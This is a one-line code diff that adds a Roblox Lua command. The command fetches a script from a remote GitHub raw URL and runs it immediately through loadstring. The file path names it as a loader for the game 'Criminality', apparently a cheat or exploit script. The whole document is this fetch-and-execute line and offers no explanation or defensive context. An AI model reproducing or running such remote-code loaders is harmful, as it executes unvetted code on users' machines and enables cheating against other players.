@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/2x-criminality-spam7-wpyss761m5s2ag.lua"))()
